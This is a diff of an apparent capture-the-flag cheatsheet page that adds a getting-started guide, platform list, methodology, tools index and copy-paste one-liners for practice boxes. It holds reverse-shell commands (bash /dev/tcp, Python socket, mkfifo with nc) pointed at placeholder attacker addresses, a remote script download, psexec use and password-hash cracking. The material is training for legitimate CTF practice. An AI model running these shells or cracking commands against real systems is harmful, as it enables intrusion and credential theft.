@@ -1,9 +1,6 @@
 ---
-header:
-  
-layout: single
-classes: wide
-author_profile: true
+layout: ctf
+author_profile: false
 categories:
   - Hacking
 tags:
@@ -16,34 +13,195 @@ tags:
   - Pentesting
   - system-hacking
   - ctf-cheatsheet
+description: "Single source of truth for CTF players: cheatsheets, tools, methodology, platforms, and one-liners for HackTheBox, VulnHub, and CTF competitions."
 toc: false
-toc_sticky: true
-toc_label: "Table of Contents"
-
-<p style="font-size: 0.65em;">
----
-# Awesome Capture the Flag Cheatsheet [![Awesome](https://awesome.re/badge-flat.svg)](https://awesome.re)[<img src="https://github.com/uppusaikiran/awesome-ctf-cheatsheet/raw/refs/heads/master/media/icons8-hacking.svg" align="right" width="150">](https://uppusaikiran.github.io/hacking/Capture-the-Flag-CheatSheet/)
-
-
-> A currated list of all capture the flag tips and strategies to solve Online CTF challenges and Hackthebox Machines.
-
-
-
 ---
 
-## Contents
+<div class="ctf-hero" id="top">
+  <h1>Capture the Flag Cheatsheet</h1>
+  <p>The single source of truth for CTF players. Methodology, platforms, tools, and copy-paste commands for HackTheBox, VulnHub, TryHackMe, and live competitions.</p>
+  <ul class="ctf-pills">
+    <li><a href="#getting-started">Getting Started</a></li>
+    <li><a href="#platforms">Platforms</a></li>
+    <li><a href="#methodology">Methodology</a></li>
+    <li><a href="#tools-index">Tools</a></li>
+    <li><a href="#flag-formats">Flags</a></li>
+    <li><a href="#one-liners">One-liners</a></li>
+    <li><a href="#resources">Resources</a></li>
+    <li class="pill-sep">|</li>
+    <li><a href="#system-hacking">System</a></li>
+    <li><a href="#web-hacking">Web</a></li>
+    <li><a href="#file-hacking">File</a></li>
+    <li><a href="#cryptography">Crypto</a></li>
+    <li><a href="#forensics">Forensics</a></li>
+    <li><a href="#password-cracking">Password</a></li>
+    <li><a href="#privilege-escalation">PrivEsc</a></li>
+  </ul>
+</div>
 
-<!-- TOC start (generated with https://github.com/derlin/bitdowntoc) -->
+<div class="ctf-body" markdown="1">
 
-- [System Hacking ](#system-hacking)
-- [Web Hacking](#web-hacking)
-- [File Hacking](#file-hacking)
-- [Cryptography](#cryptography)
-- [Forensics](#forensics)
-- [Password Cracking](#password-cracking)
-- [Privilige Escalation](#privilige-escalation)
+## Getting started
 
-<!-- TOC end -->
+**Capture the Flag (CTF)** is a security competition where you find hidden "flags" (short strings like `flag{you_got_it}`) by exploiting vulnerabilities, solving crypto puzzles, analyzing forensics data, or attacking vulnerable machines. Flags are submitted for points or to prove you've rooted a box.
+
+### CTF types
+
+| Type | How it works |
+|------|-------------|
+| **Jeopardy** | Challenges in categories (Web, Crypto, Forensics, Pwn, Rev). Solve for points. |
+| **Attack-Defense** | Teams defend their own services while attacking others for flags. |
+| **Boot2Root** | Full machine compromise (HackTheBox, VulnHub). Get user and root flags. |
+
+<div class="ctf-info" markdown="1">
+
+<h4>First 24 hours checklist</h4>
+
+1. **Join a platform** - sign up and spin up a VM or connect via VPN.
+2. **Recon** - find live hosts and open ports (`nmap`, `netdiscover`).
+3. **Enumerate** - service versions, web paths, users (`gobuster`, version checks).
+4. **Exploit** - get a shell via reverse shell, SQLi, file upload, or known CVE.
+5. **Escalate** - stabilize shell, then privilege escalate for root/administrator flag.
+
+</div>
+
+---
+
+## Platforms
+
+Where to practice and compete:
+
+<div class="ctf-card-grid">
+  <a href="https://www.hackthebox.com/" class="ctf-card" target="_blank"><strong>HackTheBox</strong><span>Linux/Windows boxes, challenges, Pro Labs</span></a>
+  <a href="https://tryhackme.com/" class="ctf-card" target="_blank"><strong>TryHackMe</strong><span>Guided rooms, beginner-friendly</span></a>
+  <a href="https://www.vulnhub.com/" class="ctf-card" target="_blank"><strong>VulnHub</strong><span>Downloadable VMs, offline practice</span></a>
+  <a href="https://ctftime.org/" class="ctf-card" target="_blank"><strong>CTFtime</strong><span>Live CTF calendar, rankings, events</span></a>
+  <a href="https://picoctf.org/" class="ctf-card" target="_blank"><strong>PicoCTF</strong><span>Beginner Jeopardy (annual + practice)</span></a>
+  <a href="https://overthewire.org/wargames/" class="ctf-card" target="_blank"><strong>OverTheWire</strong><span>Wargames (Bandit, Natas, etc.)</span></a>
+  <a href="https://pentesterlab.com/" class="ctf-card" target="_blank"><strong>PentesterLab</strong><span>Web and pentest exercises</span></a>
+</div>
+
+---
+
+## Methodology
+
+Use this flow on every box or challenge. Each step links into the cheatsheets below.
+
+<ol class="ctf-steps">
+  <li><strong>Recon</strong> - Identify targets (IPs, domains, ports). Use <a href="#nmap-scanning">Nmap</a>, netdiscover, passive sources.</li>
+  <li><strong>Enumeration</strong> - Discover services, versions, paths, users. Use <a href="#directory-bursting">dir busting</a>, <a href="#smb-is-open">SMB</a>, <a href="#web-hacking">web enumeration</a>.</li>
+  <li><strong>Exploitation</strong> - Get a shell or extract data. <a href="#one-liners">Reverse shells</a>, SQLi, file uploads, known CVEs.</li>
+  <li><strong>Post-exploitation</strong> - Stabilize shell, then <a href="#privilege-escalation">privilege escalate</a>. Use <a href="#standard-scripts-for-enumeration-ctf-cheatsheet">LinPEAS/winPEAS</a>, <a href="https://gtfobins.github.io/">GTFOBins</a>, <a href="https://lolbas-project.github.io/">LOLBAS</a>.</li>
+  <li><strong>Flag</strong> - Find and submit. Common spots: <code>/root/root.txt</code>, user home, <code>env</code>, database, or <a href="#flag-formats">see flag formats</a>.</li>
+</ol>
+
+---
+
+## Tools index
+
+Quick reference for the most-used CTF tools. Commands and details are in the cheatsheets.
+
+| Tool | Category | Use case |
+|------|----------|----------|
+| [Nmap](https://nmap.org/) | Recon | Port scan, service detection, scripts |
+| [Gobuster](https://github.com/OJ/gobuster) | Web | Dir/file/vhost brute-force |
+| [Nikto](https://cirt.net/Nikto2) | Web | Web server vulnerability scan |
+| [SQLMap](https://sqlmap.org/) | Web | SQL injection automation |
+| [CyberChef](https://gchq.github.io/CyberChef/) | General | Encode/decode, XOR, regex |
+| [LinPEAS / winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) | PrivEsc | Linux/Windows enumeration |
+| [GTFOBins](https://gtfobins.github.io/) | PrivEsc | Unix binary abuse |
+| [LOLBAS](https://lolbas-project.github.io/) | PrivEsc | Windows binary abuse |
+| [John / Hashcat](https://www.openwall.com/john/) | Password | Hash cracking |
+| [Exiftool](https://exiftool.org/) | Forensics | Metadata, stego |
+| [Wireshark](https://www.wireshark.org/) | Forensics | PCAP analysis |
+| [pspy](https://github.com/DominicBreuker/pspy) | PrivEsc | Process/cron watch |
+
+---
+
+## Flag formats
+
+**Common patterns:** `flag{...}`, `FLAG{...}`, `CTF{...}`, `HTB{...}`, `THM{...}`, or raw hex/base64 strings.
+
+**Where to look:** `/root/root.txt`, user home, config/backup files, environment variables (`env`), web source/headers/cookies/JS, database dumps, PCAP data.
+
+<div class="ctf-tip" markdown="1">
+
+<h4>Quick search from a shell</h4>
+
+```bash
+grep -rE 'flag\{|HTB\{|CTF\{|THM\{' / 2>/dev/null
+strings /path/to/binary | grep -E 'flag|CTF|HTB'
+```
+
+</div>
+
+---
+
+## One-liners
+
+Copy-paste commands. Replace `<TARGET>`, `<YOUR_IP>`, and ports as needed.
+
+### File transfer
+
+```bash
+python3 -m http.server 8000
+# Target: wget http://<YOUR_IP>:8000/file.sh
+```
+
+### Recon
+
+```bash
+nmap -sC -sV -oN scan.txt <TARGET_IP>
+gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -t 50
+```
+
+### Reverse shells
+
+Start listener first: `nc -lvnp 4444`
+
+**Bash:**
+```bash
+bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1
+```
+
+**Python:**
+```bash
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+```
+
+### Shell stabilization
+
+```bash
+python3 -c "import pty; pty.spawn('/bin/bash')"
+# Ctrl+Z, then locally: stty raw -echo; fg
+```
+
+---
+
+## Resources
+
+- **[CTFWriteups](https://github.com/uppusaikiran/CTFWriteups)** - HackTheBox, VulnHub, and CTF solutions by the author.
+- **[GTFOBins](https://gtfobins.github.io/)** - Unix binary abuse for privilege escalation.
+- **[LOLBAS](https://lolbas-project.github.io/)** - Windows Living Off The Land binaries.
+- **[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)** - Payloads and cheatsheets for every attack type.
+- **[HackTricks](https://book.hacktricks.xyz/)** - Pentesting and CTF techniques encyclopedia.
+- **[CTF 101](https://ctf101.org/)** - Beginner introduction to CTF categories.
+
+---
+
+## Cheatsheets
+
+<ul class="ctf-section-index">
+  <li><a href="#system-hacking">System Hacking<span>Nmap, netdiscover, SMB, service enum</span></a></li>
+  <li><a href="#web-hacking">Web Hacking<span>Dir busting, SQLi, WordPress, Nikto</span></a></li>
+  <li><a href="#file-hacking">File Hacking<span>Archives, PDFs, binaries, encoding</span></a></li>
+  <li><a href="#cryptography">Cryptography<span>Ciphers, hashes, SSH keys, OTP</span></a></li>
+  <li><a href="#forensics">Forensics<span>Disk images, PCAP, USB, memory</span></a></li>
+  <li><a href="#password-cracking">Password Cracking<span>John, Hashcat, hash types</span></a></li>
+  <li><a href="#privilege-escalation">Privilege Escalation<span>LinPEAS, GTFOBins, cron, sudo</span></a></li>
+</ul>
+
+---
 
 ## System Hacking 
 
@@ -376,7 +534,7 @@ wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://<HOST_IP>/
 
 ### 🧠 Generating Wordlist from the Website
 
-Use `cewl` to crawl a target website and generate a custom wordlist based on its content—useful for password attacks, username discovery, or directory bruteforcing.
+Use `cewl` to crawl a target website and generate a custom wordlist based on its content. Useful for password attacks, username discovery, or directory bruteforcing.
 
 #### Basic Usage:
 ```bash
@@ -410,7 +568,7 @@ cewl -a "Mozilla/5.0" -w wordlist.txt http://<HOST_IP>/
 
 ### 📁 SMB is Open
 
-When ports **139/445** are open, the target may be running **SMB (Server Message Block)**—commonly misconfigured in CTFs, making it a goldmine for enumeration and exploitation.
+When ports **139/445** are open, the target may be running **SMB (Server Message Block)**, commonly misconfigured in CTFs. This makes it a goldmine for enumeration and exploitation.
 
 ---
 
@@ -434,7 +592,7 @@ mount -t cifs //<HOST_IP>/<SHARE> /mnt/smb/ -o username=<user>,password=<pass>
 
 ---
 
-#### 🔐 With Credentials – Using `smbmap`
+#### 🔐 With Credentials - Using `smbmap`
 ```bash
 smbmap -H <HOST_IP> -u administrator -p password
 ```
@@ -442,7 +600,7 @@ Enumerates shares, permissions, and access level.
 
 ---
 
-#### 🚀 Gaining Shell – Using `psexec.py`
+#### 🚀 Gaining Shell - Using `psexec.py`
 ```bash
 python3 /opt/impacket/examples/psexec.py administrator@<HOST_IP>
 ```
@@ -575,7 +733,7 @@ msfconsole
 
 ### 📰 WordPress Open
 
-If `/wp-login.php` is discovered during web enumeration, the target is likely running WordPress—a common and often vulnerable CMS in CTFs.
+If `/wp-login.php` is discovered during web enumeration, the target is likely running WordPress, a common and often vulnerable CMS in CTFs.
 
 ---
 
@@ -619,7 +777,7 @@ run
 ```bash
 wpscan --url http://<HOST_IP> --enumerate u
 ```
-- **Scan for outdated plugins/themes**—they’re frequent attack vectors.
+- **Scan for outdated plugins/themes** - they’re frequent attack vectors.
 - **Look for writable upload directories or `eval()` usage** in plugin files.
 - **Try LFI/SQLi on lesser-known plugins** if source code or version is known.
 
@@ -714,7 +872,7 @@ Get-NetIPAddress
 
 ---
 
-### 🧬 NoSQL Injection – Full CTF Exploitation Guide
+### 🧬 NoSQL Injection - Full CTF Exploitation Guide
 
 ---
 
@@ -849,7 +1007,7 @@ Bypass weak sanitization:
 
 ### 🎯 Final CTF Tips:
 
-- **Check login, search, filter, and API endpoints**—anywhere user input reaches MongoDB.
+- **Check login, search, filter, and API endpoints** since anywhere user input reaches MongoDB.
 - **Explore headers (`X-User`, `X-Auth`)** for NoSQL injection in hidden APIs.
 - **Always enumerate usernames before attempting bruteforce**.
 - **Look for JavaScript-enabled backends to exploit `$where`**.
@@ -880,8 +1038,8 @@ Recon is critical in CTFs. Use these tools to gather intelligence before exploit
 
 #### 🔎 Passive Reconnaissance
 
-- **Whois, Nslookup, Dig, Dnsrecon** – Basic DNS and domain info.
-- **Google Dorking (Google Fu)** – Discover exposed files or directories:
+- **Whois, Nslookup, Dig, Dnsrecon** - Basic DNS and domain info.
+- **Google Dorking (Google Fu)** - Discover exposed files or directories:
   - `site:<target.com> ext:log`
   - `intitle:index.of "backup"`
 
@@ -889,36 +1047,36 @@ Recon is critical in CTFs. Use these tools to gather intelligence before exploit
 
 #### 🌐 Subdomain & Certificate Enumeration
 
-- [**Sublist3r**](https://github.com/aboul3la/Sublist3r) – Fast subdomain discovery:
+- [**Sublist3r**](https://github.com/aboul3la/Sublist3r) - Fast subdomain discovery:
   ```bash
   sublist3r -d target.com
   ```
-- [**crt.sh**](https://crt.sh) – Public SSL certificate transparency logs.
-- [**Amass**](https://github.com/owasp-amass/amass) – Extensive subdomain and DNS enumeration.
+- [**crt.sh**](https://crt.sh) - Public SSL certificate transparency logs.
+- [**Amass**](https://github.com/owasp-amass/amass) - Extensive subdomain and DNS enumeration.
 
 ---
 
 #### 📧 Email & Breach Lookup
 
-- [**Hunter.io**](https://hunter.io) – Discover associated emails.
-- [**HaveIBeenPwned**](https://haveibeenpwned.com/) – Check email breach exposure.
-- [Clear Text Password Dataset](https://github.com/philipperemy/tensorflow-1.4-billion-password-analysis) – Build realistic password lists.
+- [**Hunter.io**](https://hunter.io) - Discover associated emails.
+- [**HaveIBeenPwned**](https://haveibeenpwned.com/) - Check email breach exposure.
+- [Clear Text Password Dataset](https://github.com/philipperemy/tensorflow-1.4-billion-password-analysis) - Build realistic password lists.
 
 ---
 
 #### 🧠 Fingerprinting and Tech Stack
 
-- **Wappalyzer**, **WhatWeb**, **BuiltWith** – Identify backend tech, CMS, or frameworks.
-- **Nmap** – Version detection and port scanning.
-- **Netcat** – Basic banner grabbing or listener setup.
+- **Wappalyzer**, **WhatWeb**, **BuiltWith** - Identify backend tech, CMS, or frameworks.
+- **Nmap** - Version detection and port scanning.
+- **Netcat** - Basic banner grabbing or listener setup.
 
 ---
 
 #### 🔐 Headers, Files, and Hidden Paths
 
-- [**SecurityHeaders**](https://securityheaders.com/) – Scan HTTP headers for misconfigurations.
-- **OWASP ZAP Proxy** – Crawl and extract hidden files or admin paths.
-- **Burp Suite** – Spider, Repeater, Intruder for thorough recon.
+- [**SecurityHeaders**](https://securityheaders.com/) - Scan HTTP headers for misconfigurations.
+- **OWASP ZAP Proxy** - Crawl and extract hidden files or admin paths.
+- **Burp Suite** - Spider, Repeater, Intruder for thorough recon.
 
 ---
 
@@ -936,7 +1094,7 @@ theharvester -d microsoft.com -l 200 -g -b google
 
 - Always run recon in **parallel threads** (subdomains, certs, emails, etc.).
 - Use findings to create a **custom wordlist** for bruteforce (e.g., via `cewl`, `crunch`).
-- Pivot findings into active attacks — open ports, login panels, emails, and misconfigs often lead to the first foothold.
+- Pivot findings into active attacks - open ports, login panels, emails, and misconfigs often lead to the first foothold.
 
 
 ### Scanning
@@ -1066,7 +1224,7 @@ perl -MIO -e '$p=fork;exit if $p;...'
 ```
 - Use it when you gain command execution via web.
 - Swap in your IP and port.
-- Stable but easily detectable—upgrade shell after.
+- Stable but easily detectable. Upgrade shell after.
 
 ---
 
@@ -1092,7 +1250,7 @@ export TERM=xterm
 
 - **Always try multiple shell methods:** Bash, Python, Perl, PHP, Socat.
 - **Use `rlwrap` or `script` to wrap Netcat** for history/navigation.
-- **Some machines block Netcat**—use `socat` or `mkfifo` shell:
+- **Some machines block Netcat**, use `socat` or `mkfifo` shell:
 ```bash
 mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc <ATTACKER_IP> <PORT> > /tmp/f
 ```
@@ -1154,9 +1312,9 @@ p = gdb.debug("./vuln", gdbscript="b *main\ncontinue")
 
 ---
 
-### 🚪 Gobuster – Directory & File Enumeration
+### 🚪 Gobuster - Directory & File Enumeration
 
-Gobuster is a fast, flexible tool used to brute-force directories, files, and virtual hosts on web servers—critical for discovering hidden content during CTFs.
+Gobuster is a fast, flexible tool used to brute-force directories, files, and virtual hosts on web servers, critical for discovering hidden content during CTFs.
 
 ---
 
@@ -1211,7 +1369,7 @@ gobuster dir -k -u https://<IP_ADDRESS> -w ...
 
 ---
 
-### 🧬 SQLMap – SQL Injection Automation
+### 🧬 SQLMap - SQL Injection Automation
 
 SQLMap automates the detection and exploitation of SQL injection flaws. In CTFs, it’s a fast way to extract databases, users, tables, and even get shells.
 
@@ -1561,21 +1719,21 @@ Use this online bruteforce solver:
 
 - If ciphertext is **all caps with no spaces**, suspect Vigenère or Playfair.
 
-- **Layered encoding** (e.g., base64 → Vigenère → Caesar) is common—decode in reverse.
+- **Layered encoding** (e.g., base64 → Vigenère → Caesar) is common. Decode in reverse.
 
 
 ---
 
 ### 🗝️ One-Time Pad (OTP) Cipher
 
-The **One-Time Pad** is an unbreakable cipher when used properly (random key, used once, same length as plaintext). In CTFs, it's often improperly implemented—making it crackable.
+The **One-Time Pad** is an unbreakable cipher when used properly (random key, used once, same length as plaintext). In CTFs, it's often improperly implemented, making it crackable.
 
 ---
 
 #### 🔓 Solve OTP Easily
 
 Use this online tool:
-👉 [**OTP Decryption Tool**](http://rumkin.com/tools/cipher/otp.php)
+👉 [**OTP Decryption Tool**](https://rumkin.com/tools/cipher/otp.php)
 
 - Input the **ciphertext** and **key** (or guess/bruteforce if reused or predictable).
 - Decryption is done via XOR of ciphertext and key.
@@ -1597,7 +1755,7 @@ john output.hash --wordlist=/usr/share/wordlists/rockyou.txt
 
 ### 🎯 Pro Tips for CTFs:
 
-- **OTP ciphertext and key must be same length** — verify before decoding.
+- **OTP ciphertext and key must be same length** - verify before decoding.
 - If a reused key is suspected, treat it like a **Vigenère with XOR**.
 - **Use hex editors or `xxd`** to identify XOR patterns in binary OTP files.
 - Check if the key is:
@@ -1635,7 +1793,7 @@ exiftool <FILE_NAME>
 
 ---
 
-#### 🔍 Steganography – Extract Hidden Data
+#### 🔍 Steganography - Extract Hidden Data
 
 **Use `zsteg` for LSB & color-channel payloads** (PNG only):
 ```bash
@@ -1646,7 +1804,7 @@ zsteg <FILE_NAME>
 ```bash
 steghide extract -sf <FILE_NAME>
 ```
-- Prompts for password—use `rockyou.txt` for brute-force attempts.
+- Prompts for password, use `rockyou.txt` for brute-force attempts.
 
 **Brute-force `steghide` with `steghide_brute`** (optional tool):
 ```bash
@@ -1683,7 +1841,7 @@ tesseract <FILE_NAME> stdout
 
 ---
 
-### 🧪 Binwalk – Embedded Data Extraction
+### 🧪 Binwalk - Embedded Data Extraction
 
 `binwalk` is used to analyze binary files (like images or firmware) for **embedded files**, **compressed archives**, or **hidden content**.
 
@@ -1732,7 +1890,7 @@ binwalk --dd='.*' <IMAGE_NAME>
 
 - **Combine with `steghide`, `exiftool`, and `zsteg`** after extraction.
 
-- **Inspect `footer` of embedded files** — flags may be appended after legitimate content.
+- **Inspect `footer` of embedded files** - flags may be appended after legitimate content.
 
 - **Good for challenges involving firmware, DOCX/XLSX, or disguised file formats**.
 
@@ -1741,7 +1899,7 @@ binwalk --dd='.*' <IMAGE_NAME>
 
 ### 💽 Extract NTFS Filesystem
 
-NTFS files may contain **hidden data**, **alternate streams**, or **partitioned content**—commonly leveraged in CTFs.
+NTFS files may contain **hidden data**, **alternate streams**, or **partitioned content**, commonly leveraged in CTFs.
 
 ---
 
@@ -1795,7 +1953,7 @@ strings <FILE_NAME> | grep -i ":"
 
 ### 🧷 Recover Files from Deleted File Systems (Remote Forensics)
 
-Use this method to **image and extract deleted file systems** remotely—commonly required in forensic or IR-based CTFs.
+Use this method to **image and extract deleted file systems** remotely, commonly required in forensic or IR-based CTFs.
 
 ---
 
@@ -1850,7 +2008,7 @@ icat extract.dd <inode>
 
 ---
 
-### 📡 Packet Capture – USB Keystroke Recovery
+### 📡 Packet Capture - USB Keystroke Recovery
 
 In CTFs, `.pcap` or `.pcapng` files may contain **USB keyboard traffic**, especially when analyzing hardware-level challenges.
 
@@ -1917,7 +2075,7 @@ Use this online tool:
 
 ### 🎯 Pro Tips for CTFs:
 
-- **Look for base64, hex, or `eval()` patterns**—common obfuscation tricks.
+- **Look for base64, hex, or `eval()` patterns**, common obfuscation tricks.
 - **Replace `eval()` with `console.log()`** to inspect decoded payload.
 - Use browser DevTools:
   - Paste obfuscated JS into the Console.
@@ -1933,7 +2091,7 @@ Use this online tool:
 
 ---
 
-### 🔑 JOHN the Ripper – Password Cracking
+### 🔑 JOHN the Ripper - Password Cracking
 
 If the challenge references **"JOHN"**, it's likely hinting at using **John the Ripper** to crack hashes or protected archives.
 
@@ -1994,7 +2152,7 @@ john ssh.hash --wordlist=rockyou.txt
 
 ---
 
-### 🧬 SAM Hashes – Windows User Password Dump
+### 🧬 SAM Hashes - Windows User Password Dump
 
 **SAM (Security Account Manager)** stores hashed passwords for Windows accounts. In CTFs, it’s often extracted from mounted `.vhd` or `.img` disk files.
 
@@ -2044,12 +2202,12 @@ john hashes.txt --format=NT --wordlist=rockyou.txt
 
 ---
 
-### 🐧 Linux User Hashes – `/etc/passwd` + `/etc/shadow`
+### 🐧 Linux User Hashes - `/etc/passwd` + `/etc/shadow`
 
 In Linux systems, user credentials are stored across two files:
 
-- `/etc/passwd` – stores usernames and UID info
-- `/etc/shadow` – stores password hashes (restricted access)
+- `/etc/passwd` - stores usernames and UID info
+- `/etc/shadow` - stores password hashes (restricted access)
 
 ---
 
@@ -2072,9 +2230,9 @@ john merged_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 - **You can extract these from VMs, Docker containers, or mounted file systems.**
 - Look for password hashes starting with:
-  - `$6$` – SHA-512
-  - `$1$` – MD5
-  - `$y$` – yescrypt (more secure)
+  - `$6$` - SHA-512
+  - `$1$` - MD5
+  - `$y$` - yescrypt (more secure)
 - **Use `john --show`** to reveal cracked results:
 ```bash
 john --show merged_hashes.txt
@@ -2088,9 +2246,9 @@ john onehash.txt --wordlist=rockyou.txt
 
 ---
 
-### 🔓 Hashcat – GPU-Accelerated Password Cracking
+### 🔓 Hashcat - GPU-Accelerated Password Cracking
 
-Hashcat is a powerful tool to crack hashes using GPU acceleration—ideal for large datasets or tougher hashes.
+Hashcat is a powerful tool to crack hashes using GPU acceleration, ideal for large datasets or tougher hashes.
 
 ---
 
@@ -2111,11 +2269,11 @@ hashcat -m 500 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt -
 
 | Hash Type        | Example Prefix | Mode |
 |------------------|----------------|------|
-| MD5              | —              | 0    |
-| SHA1             | —              | 100  |
-| SHA256           | —              | 1400 |
+| MD5              | -              | 0    |
+| SHA1             | -              | 100  |
+| SHA256           | -              | 1400 |
 | bcrypt           | `$2y$`, `$2b$` | 3200 |
-| NTLM             | —              | 1000 |
+| NTLM             | -              | 1000 |
 | SHA512-crypt     | `$6$`          | 1800 |
 | MD5-crypt        | `$1$`          | 500  |
 
@@ -2180,23 +2338,23 @@ john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
 
 - If `john` fails, try `hashcat` with proper hash mode (e.g., `-m 14600` for 7z).
 - SSH private key cracks often lead to **user shells or privilege escalation**.
-- Always check metadata or filenames (like `backup.7z`, `id_rsa.bak`)—they often contain valuable credentials.
+- Always check metadata or filenames (like `backup.7z`, `id_rsa.bak`) - they often contain valuable credentials.
 
 
-## Privilige Escalation
+## Privilege Escalation
 
 ---
 
 ### 🧰 Standard Scripts for Enumeration (CTF Cheatsheet)
 
-Use these tools to automate **privilege escalation**, **system enumeration**, and **data decoding**—critical for post-exploitation in CTFs.
+Use these tools to automate **privilege escalation**, **system enumeration**, and **data decoding**, critical for post-exploitation in CTFs.
 
 ---
 
 #### 🐧 Linux Enumeration
 
 - 🔍 [**LinEnum**](https://github.com/rebootuser/LinEnum)  
-  - Automates full Linux system enumeration—users, crons, SUIDs, kernels.
+  - Automates full Linux system enumeration: users, crons, SUIDs, kernels.
 
 - 🧠 [**LinuxPrivChecker**](https://github.com/sleventyeleven/linuxprivchecker)  
   - Python-based privilege escalation checker (great for local root).
@@ -2205,7 +2363,7 @@ Use these tools to automate **privilege escalation**, **system enumeration**, an
   - Shell script that checks common privilege escalation vectors.
 
 - 📋 [**PEASS-ng (Linux)**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)  
-  - `linpeas.sh` – Most comprehensive local enumeration script.
+  - `linpeas.sh` - Most comprehensive local enumeration script.
 
 ---
 
@@ -2215,7 +2373,7 @@ Use these tools to automate **privilege escalation**, **system enumeration**, an
   - PowerShell script to scan Windows for escalation paths.
 
 - 📋 [**PEASS-ng (Windows)**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)  
-  - `winPEAS.exe` – Deep enumeration of Windows services, tasks, misconfigs.
+  - `winPEAS.exe` - Deep enumeration of Windows services, tasks, misconfigs.
 
 ---
 
@@ -2232,7 +2390,7 @@ Use these tools to automate **privilege escalation**, **system enumeration**, an
   - Helps exploit `sudo`, `setuid`, and capability binaries for privilege escalation.
 
 - 📑 [**LOLBAS**](https://lolbas-project.github.io/)  
-  - Windows equivalent to GTFOBins—enumerate and abuse trusted binaries.
+  - Windows equivalent to GTFOBins. Enumerate and abuse trusted binaries.
 
 ---
 
@@ -2393,7 +2551,7 @@ rename id_rsa.pub .ssh/authorized_keys
 
 ---
 
-### 🕵️ Reconnoitre – Enumeration Automation
+### 🕵️ Reconnoitre - Enumeration Automation
 
 Multi-threaded recon and service enumeration:
 👉 [Reconnoitre Tool](https://github.com/codingo/Reconnoitre)
@@ -2403,4 +2561,7 @@ reconnoitre -t <TARGET_IP> -o `pwd` --services
 ```
 
 ---
-</p>
+
+<div class="ctf-backtop"><a href="#top">Back to top</a></div>
+
+</div>
